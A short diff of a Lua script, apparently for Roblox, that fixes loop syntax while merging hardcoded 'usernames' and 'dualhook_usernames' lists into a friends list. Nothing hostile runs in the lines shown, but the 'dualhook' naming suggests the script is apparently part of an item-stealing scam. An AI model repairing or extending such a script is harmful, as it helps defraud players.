@@ -3,8 +3,12 @@ local usernames = {"abduljamarmm2t"}
 local dualhook_usernames = {"B4C0NN63"}
 local allFriends = {}
 
-for _, name in ipairs(usernames) do table.insert(allFriends, name) end
-for _, name in dualhook_usernames do 
+for _, name in ipairs(usernames) do 
+    table.insert(allFriends, name) 
+end
+
+-- Added ipairs() here to fix the loop syntax
+for _, name in ipairs(dualhook_usernames) do 
     if name ~= "" and not table.find(allFriends, name) then 
         table.insert(allFriends, name) 
     end 
